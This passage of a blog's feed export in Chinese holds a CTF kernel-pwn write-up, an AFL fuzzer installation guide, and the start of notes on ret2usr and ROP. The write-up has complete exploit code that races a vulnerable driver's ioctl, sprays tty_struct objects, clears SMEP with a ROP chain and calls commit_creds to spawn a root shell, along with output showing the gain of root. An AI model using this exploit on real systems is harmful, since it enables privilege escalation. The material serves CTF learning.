*/</span></span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *, struct tty_struct *);              <span class="comment">/*    16     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*open)(struct tty_struct *, struct file *);                       <span class="comment">/*    24     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct *, struct file *);                     <span class="comment">/*    32     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *);                                 <span class="comment">/*    40     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *);                                  <span class="comment">/*    48     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*write)(struct tty_struct *, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">int</span>);         <span class="comment">/*    56     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">    <span class="keyword">int</span> (*put_char)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">char</span>);                            <span class="comment">/*    64     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *);                                       <span class="comment">/*    72     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*write_room)(struct tty_struct *);                                         <span class="comment">/*    80     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*chars_in_buffer)(struct tty_struct *);                                    <span class="comment">/*    88     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*ioctl)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>);             <span class="comment">/*    96     8 */</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">int</span> <span class="params">(*compat_ioctl)</span><span class="params">(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)</span></span>; <span class="comment">/*   104     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *, struct ktermios *);                    <span class="comment">/*   112     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct *);                                          <span class="comment">/*   120     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 2 boundary (128 bytes) --- */</span></span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct *);           <span class="comment">/*   128     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *);                 <span class="comment">/*   136     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *);                <span class="comment">/*   144     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *);               <span class="comment">/*   152     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *, <span class="keyword">int</span>);        <span class="comment">/*   160     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *);         <span class="comment">/*   168     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *);            <span class="comment">/*   176     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *, <span class="keyword">int</span>); <span class="comment">/*   184     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 3 boundary (192 bytes) --- */</span></span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *, <span class="keyword">char</span>);                           <span class="comment">/*   192     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *);                                    <span class="comment">/*   200     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);        <span class="comment">/*   208     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *, struct winsize *);                    <span class="comment">/*   216     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *, struct termiox *);               <span class="comment">/*   224     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); <span class="comment">/*   232     8 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span>                                 <span class="comment">/*   240     8 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* size: 248, cachelines: 4, members: 31 */</span></span><br><span class="line">    <span class="comment">/* last cacheline: 56 bytes */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">"sh"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">fake_ops</span>;</span></span><br><span class="line"><span class="keyword">int</span> fff = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">char</span> fake_procfops[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss,user_rflags, user_sp ,user_gs,user_es,user_fs,user_ds;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">    <span class="string">"mov %%cs, %0\n"</span></span><br><span class="line">    <span class="string">"mov %%ss,%1\n"</span></span><br><span class="line">    <span class="string">"mov %%rsp,%2\n"</span></span><br><span class="line">    <span class="string">"pushfq\n"</span></span><br><span class="line">    <span class="string">"pop %3\n"</span></span><br><span class="line">    <span class="string">"mov %%gs,%4\n"</span></span><br><span class="line">    <span class="string">"mov %%es,%5\n"</span></span><br><span class="line">    <span class="string">"mov %%fs,%6\n"</span></span><br><span class="line">    <span class="string">"mov %%ds,%7\n"</span>  </span><br><span class="line">    ::<span class="string">"m"</span>(user_cs),<span class="string">"m"</span>(user_ss),<span class="string">"m"</span>(user_sp),<span class="string">"m"</span>(user_rflags),<span class="string">"m"</span>(user_gs),<span class="string">"m"</span>(user_es),<span class="string">"m"</span>(user_fs),<span class="string">"m"</span>(user_ds)</span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*]status has been saved."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">void get_root()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    void * (*pkc)(int) = (void *(*)(int))prepare_kernel_cred;</span></span><br><span class="line"><span class="comment">    void (*cc)(void *) = (void (*)(void * ))commit_cred;</span></span><br><span class="line"><span class="comment">    (*cc)((*pkc)(0));</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">size_t</span>*a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(fff==<span class="number">1</span>)&#123;</span><br><span class="line">        *a=<span class="number">0x2e0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">   _commit_creds commit_creds=<span class="number">0xffffffff810ad430</span>;</span><br><span class="line">    _prepare_kernel_cred prepare_kernel_cred=<span class="number">0xffffffff810ad7e0</span>;</span><br><span class="line"><span class="comment">//cd ./core/tmp &amp;&amp; gcc exp.c -pthread --static  -g -o exp &amp;&amp; cd .. &amp;&amp; ./gen_cpio.sh initramfs.cpio &amp;&amp; cd .. &amp;&amp; ./startvm.sh</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sudo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"push %0\n"</span></span><br><span class="line">        <span class="string">"push %1\n"</span></span><br><span class="line">        <span class="string">"push %2\n"</span></span><br><span class="line">        <span class="string">"push %3\n"</span></span><br><span class="line">        <span class="string">"push %4\n"</span></span><br><span class="line">        <span class="string">"push $0\n"</span></span><br><span class="line">        <span class="string">"swapgs\n"</span></span><br><span class="line">        <span class="string">"pop %%rbp\n"</span></span><br><span class="line">        <span class="string">"iretq\n"</span>    </span><br><span class="line">        ::<span class="string">"m"</span>(user_ss),<span class="string">"m"</span>(user_sp),<span class="string">"m"</span>(user_rflags),<span class="string">"m"</span>(user_cs),<span class="string">"a"</span>(&amp;get_shell)    </span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *buf2 = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">int</span> fd  = open(<span class="string">"/dev/noob"</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">pthread_t</span> t1;</span><br><span class="line">    pthread_create(&amp;t1,<span class="literal">NULL</span>,change,&amp;buf[<span class="number">2</span>]);</span><br><span class="line">    buf[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">2</span>]=<span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100000</span>;i++)</span><br><span class="line">    &#123;   buf[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        ioctl(fd,<span class="number">0x30000</span>,buf);</span><br><span class="line">    &#125;</span><br><span class="line">    fff=<span class="number">0</span>;</span><br><span class="line">    pthread_join(t1,<span class="literal">NULL</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,buf);</span><br><span class="line">    <span class="comment">/*close(fd);</span></span><br><span class="line"><span class="comment">    int pid = fork();</span></span><br><span class="line"><span class="comment">    if(pid &lt; 0)&#123;</span></span><br><span class="line"><span class="comment">        puts("fork error");</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    else if(pid==0)&#123;</span></span><br><span class="line"><span class="comment">        char zeros[30] = &#123;0&#125;;</span></span><br><span class="line"><span class="comment">        buf[2] = 28;</span></span><br><span class="line"><span class="comment">        buf[1] = (size_t) zeros;</span></span><br><span class="line"><span class="comment">        ioctl(fd2,0x30002,buf);</span></span><br><span class="line"><span class="comment">        if(getuid==0)&#123;</span></span><br><span class="line"><span class="comment">            puts("[+] root now.");</span></span><br><span class="line"><span class="comment">system("/bin/sh");</span></span><br><span class="line"><span class="comment">exit(0);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else&#123;</span></span><br><span class="line"><span class="comment">            puts("[*]fail");</span></span><br><span class="line"><span class="comment">            exit(0);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    else&#123;</span></span><br><span class="line"><span class="comment">        wait(NULL);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">size_t</span> xchgeaxesp=<span class="number">0xffffffff8101db17</span>;;<span class="comment">//0xffffffff81007808;</span></span><br><span class="line">   <span class="keyword">size_t</span> fake_stack=xchgeaxesp&amp;<span class="number">0xffffffff</span>;  </span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(mmap((<span class="keyword">void</span>*)(fake_stack&amp;<span class="number">0xfffff000</span>), <span class="number">0x3000</span>, <span class="number">7</span>, <span class="number">0x22</span>, <span class="number">-1</span>, <span class="number">0</span>)!=(fake_stack&amp;<span class="number">0xfffff000</span>))&#123; <span class="comment">//这里是mmap地址</span></span><br><span class="line">       perror(<span class="string">"mmap"</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">size_t</span> rop[] = </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xffffffff813f6c9d</span>,     <span class="comment">// pop rdi; ret;</span></span><br><span class="line">        <span class="number">0x6f0</span>,                  <span class="comment">// cr4 with smep disabled</span></span><br><span class="line">        <span class="number">0xffffffff81069b14</span>,     <span class="comment">// mov cr4, rdi; ret;</span></span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        (<span class="keyword">size_t</span>) sudo</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;fake_ops, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_ops));<span class="comment">//把rop写栈中</span></span><br><span class="line">    <span class="built_in">memset</span>(fake_procfops, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_procfops));</span><br><span class="line">    fake_ops.proc_fops = &amp;fake_procfops;</span><br><span class="line">    fake_ops.ioctl = xchgeaxesp;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)fake_stack, rop, <span class="keyword">sizeof</span>(rop));</span><br><span class="line">    <span class="keyword">size_t</span> buf_e[<span class="number">0x20</span>/<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        spray_fd[i] = open(<span class="string">"/dev/ptmx"</span>,O_RDWR|O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span>(spray_fd[i]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            perror(<span class="string">"open tty"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[+] Reading buffer content from kernel buffer"</span>);</span><br><span class="line">    buf[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">1</span>]=(<span class="keyword">size_t</span>)buf_e;</span><br><span class="line">    buf[<span class="number">2</span>]=<span class="number">0x20</span>;</span><br><span class="line">    ioctl(fd, <span class="number">0x30003</span>, buf);</span><br><span class="line">    buf_e[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;fake_ops;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%lx\n"</span>,buf_e[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(fd, <span class="number">0x30002</span>, buf);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        ioctl(spray_fd[i],<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Welcome :)</span><br><span class="line">~ $ id</span><br><span class="line">uid=1000(pwn) gid=1000 groups=1000</span><br><span class="line">~ $ /tmp/exp</span><br><span class="line">exp      exp.c    exp1.c   expliot</span><br><span class="line">~ $ /tmp/expliot </span><br><span class="line">[*]status has been saved.</span><br><span class="line">[+] Reading buffer content from kernel buffer</span><br><span class="line">100005401</span><br><span class="line">0</span><br><span class="line">ffff88000620f0c0</span><br><span class="line">6e23a0</span><br><span class="line"></span><br><span class="line">/home/pwn # id</span><br><span class="line">uid=0(root) gid=0</span><br><span class="line">/home/pwn #</span><br></pre></td></tr></table></figure><p>补充：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptmx设备是tty设备的一种,open函数被tty核心调用, 当一个用户对这个tty驱动被分配的设备节点调用open时tty核心使用一个指向分配给这个设备的tty_struct结构的指针调用它,也就是说我们在调用了open函数了之后会创建一个`tty_struct`结构体,然而最关键的是这个tty_struct也是通过kmalloc申请出来的一个堆空间</span><br><span class="line">for --钞sir师傅</span><br></pre></td></tr></table></figure><p>这次比赛的kernel还是用到最常见的uaf，越界访问。足以看出其实kernel pwn和用户态的pwn 利用点是差不多的，主要是在利用方式。kernel pwn有很多可以利用的结构体之类的数据结构，也涉及到了进程和线程间通信的问题。往往比较复杂。<br>最后一道还有可以修复modprobe_path指向一个错误的二进制文件进行getshell。<br>感谢 peanuts师傅的指导</p><p>参考链接<br><a href="http://blog.lujun9972.win/blog/2018/08/03/%E5%A6%82%E4%BD%95%E7%A6%81%E6%AD%A2%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%9F%A5%E7%9C%8Bdmesg%E4%BF%A1%E6%81%AF/index.html" target="_blank" rel="noopener">dmesg_restrict</a><br><a href="https://blog.csdn.net/flyingnosky/article/details/97407811" target="_blank" rel="noopener">kptr_restrict</a><br><a href="http://mask6asok.top/2020/02/06/Linux_Kernel_Pwn_4.html" target="_blank" rel="noopener">double fetch</a><br><a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">一道简单内核题入门内核利用</a><br><a href="https://xz.aliyun.com/t/5847" target="_blank" rel="noopener">绕过smep</a><br><a href="https://kirin-say.top/2020/03/10/Kernoob-kmalloc-without-SMAP/" target="_blank" rel="noopener">modprobe_path</a></p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://leave-Devour.github.io/categories/pwn/"/>
    
    
      <category term="kernel" scheme="https://leave-Devour.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>AFL安装</title>
    <link href="https://leave-devour.github.io/2020/02/14/AFL%E5%AE%89%E8%A3%85/"/>
    <id>https://leave-devour.github.io/2020/02/14/AFL%E5%AE%89%E8%A3%85/</id>
    <published>2020-02-14T05:43:31.000Z</published>
    <updated>2020-04-02T08:18:17.266Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a>`afl`是fuzz里面比较老的一个工具，并且很出名。afl更加侧重于源码编译的c和c++程序。afl通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率，大致流程如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">①从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）</span><br><span class="line"></span><br><span class="line">②选择一些输入文件，作为初始测试集加入输入队列（queue）</span><br><span class="line"></span><br><span class="line">③将队列中的文件按一定的策略进行“突变”</span><br><span class="line"></span><br><span class="line">④如果经过变异文件更新了覆盖范围，则将其保留添加到队列中</span><br><span class="line"></span><br><span class="line">⑤上述过程会一直循环进行，期间触发了crash的文件会被记录下来</span><br></pre></td></tr></table></figure><p>首先在<a href="http://releases.llvm.org/download.html" target="_blank" rel="noopener">llvm</a>里面下载llvm源码<br>一般下载下面4个包就ok</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">LLVM source code (.sig)</span><br><span class="line">Clang source code (.sig)</span><br><span class="line">clang-tools-extra (.sig)</span><br><span class="line">compiler-rt source code (.sig)</span><br></pre></td></tr></table></figure><p>然后解压，把名字改掉，放到对应的目录里面就欧克</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv Clang llvm/tools</span><br><span class="line">mv extra llvm/tools/Clang</span><br><span class="line">mv compiler llvm/project</span><br></pre></td></tr></table></figure><p>然后在 另一个目录里面新建一个build文件夹，在里面进行编译，防止代码污染。cmake编译的时候选release编译会比较快，带debug的很慢。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -G &quot;Unix Makefiles&quot; -DLLVM_ENABLE_ASSERTIONS=On -DCMAKE_BUILD_TYPE=Release ../llvm</span><br><span class="line">make -j4</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>装llvm和clang环境就可以开始</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd afl</span><br><span class="line">make</span><br><span class="line">install</span><br><span class="line">cd llvm_mode</span><br><span class="line">mkdir test_build</span><br><span class="line">make</span><br><span class="line">cd ..</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>在编译的时候要用afl-gcc来代替gcc，对程序进行插桩<br><a href="https://xz.aliyun.com/t/1541" target="_blank" rel="noopener">参考链接</a><br><a href="https://blog.csdn.net/Wang_shiling/article/details/80164661" target="_blank" rel="noopener">参考链接</a></p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="Fuzzing" scheme="https://leave-Devour.github.io/categories/Fuzzing/"/>
    
    
      <category term="Automation" scheme="https://leave-Devour.github.io/tags/Automation/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn ret2usr and rop</title>
    <link href="https://leave-devour.github.io/2020/02/12/kernel-pwn-ret2usr-and-rop/"/>
    <id>https://leave-devour.github.io/2020/02/12/kernel-pwn-ret2usr-and-rop/</id>
    <published>2020-02-12T14:52:21.000Z</published>
    <updated>2020-02-12T18:11:15.527Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><h3 id="一些前置知识"><a href="#一些前置知识" class="headerlink" title="一些前置知识"></a>一些前置知识</h3><h4 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       ioctl - control device</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       #include &lt;sys/ioctl.h&gt;</span><br><span class="line"></span><br><span class="line">       int ioctl(int fd, unsigned long request, ...);</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       The ioctl() system call manipulates the underlying device parameters of special</span><br><span class="line">       files.  In particular, many  operating  characteristics  of  character  special</span><br><span class="line">       files  (e.g., terminals) may be controlled with ioctl() requests.  The argument</span><br><span class="line">       fd must be an open file descriptor.</span><br><span class="line"></span><br><span class="line">       The second argument is a device-dependent request code.  The third argument  is</span><br><span class="line">       an  untyped  pointer  to  memory.  It&apos;s traditionally char *argp (from the days</span><br><span class="line">       before void * was valid C), and will be so named for this discussion.</span><br><span class="line"></span><br><span class="line">       An ioctl() request has encoded in it whether the argument is an in parameter or</span><br><span class="line">       out  parameter, and the size of the argument argp in bytes.  Macros and defines</span><br><span class="line">       used in specifying an ioctl() request are located in the file &lt;sys/ioctl.h&gt;.</span><br></pre></td></tr></table></figure><p>ioctl 就是用于设备间的通信，第一参数是打开设备时返回的文件描述符。第二个参数就是用户程序对设备的控制命令，后面是一些补充的命令。</p><h4 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h4><h5 id="从user-space-to-kernel-space"><a href="#从user-space-to-kernel-space" class="headerlink" title="从user space to kernel space"></a>从user space to kernel space</h5><p>当发生 <code>系统调用</code>，<code>产生异常</code>,<code>外设产生中断</code>等事件的时候，就会发生用户态到内核太的切换，<br>具体的过程为：<br>· 通过<code>swapgs</code>切换GS段寄存器，将GS寄存器和一个特定的位置的值进行交换，目的是保持当前的GS值，同时将该位置作为内核执行时的GS值使用。<br>· 将当前的栈顶(用户空间栈顶)记录在CPU独占的变量区域里，将CPU独占区域里记录的内核栈顶放入rsp/esp<br>· 通过push保存各寄存器，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"> /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line">    </span><br><span class="line"> /* 保存栈值，并设置内核栈 */</span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span><br><span class="line">/* Construct struct pt_regs on stack */</span><br><span class="line">pushq  $__USER_DS      /* pt_regs-&gt;ss */</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs-&gt;sp */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS      /* pt_regs-&gt;cs */</span><br><span class="line">pushq  %rcx             /* pt_regs-&gt;ip */</span><br><span class="line">pushq  %rax             /* pt_regs-&gt;orig_ax */</span><br><span class="line">pushq  %rdi             /* pt_regs-&gt;di */</span><br><span class="line">pushq  %rsi             /* pt_regs-&gt;si */</span><br><span class="line">pushq  %rdx             /* pt_regs-&gt;dx */</span><br><span class="line">pushq  %rcx tuichu    /* pt_regs-&gt;cx */</span><br><span class="line">pushq  $-ENOSYS        /* pt_regs-&gt;ax */</span><br><span class="line">pushq  %r8              /* pt_regs-&gt;r8 */</span><br><span class="line">pushq  %r9              /* pt_regs-&gt;r9 */</span><br><span class="line">pushq  %r10             /* pt_regs-&gt;r10 */</span><br><span class="line">pushq  %r11             /* pt_regs-&gt;r11 */</span><br><span class="line">sub $(6*8), %rsp      /* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></pre></td></tr></table></figure><p>· 通过汇编指令判断是否为x32_abi<br>· 通过系统调用号，跳到全局变量sys_call_table相应位置继续执行系统调用</p><h5 id="kernel-spces-to-user-space"><a href="#kernel-spces-to-user-space" class="headerlink" title="kernel spces to user space"></a>kernel spces to user space</h5><p>· 通过<code>swapgs</code>恢复之前保存GS值<br>· 通过<code>sysretq</code>或者<code>iretq</code>恢复用户控件继续执行。如果使用<code>iretq</code>还需要给出用户空间的一些信息(CS,eflags/rflags,esp/rsp等)</p><h4 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h4><p>这个结构体记录进程的权限，如果能读写这个结构体，就可以修改进程的权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span 